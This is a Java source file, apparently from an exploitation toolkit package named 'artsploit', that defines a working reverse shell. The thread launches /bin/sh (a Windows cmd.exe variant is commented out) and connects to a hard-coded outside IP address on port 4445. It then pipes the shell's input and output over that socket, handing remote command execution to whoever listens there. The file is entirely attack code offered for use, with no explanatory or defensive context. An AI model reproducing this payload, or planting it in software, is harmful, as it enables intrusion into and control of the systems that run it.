package artsploit;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Shell extends Thread {
    public void run() {
        try {
            //Pure Groovy/Java Reverse Shell
            //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

            String lhost = "51.15.254.246";
            int lport = 4445;
            ////            String cmd = "cmd.exe"; //win
            String cmd = "/bin/sh"; //linux
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(lhost, lport);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {

                }
            }
            p.destroy();
            s.close();

        } catch (Exception e) {
            e.printStackTrace();

        }
    }
}
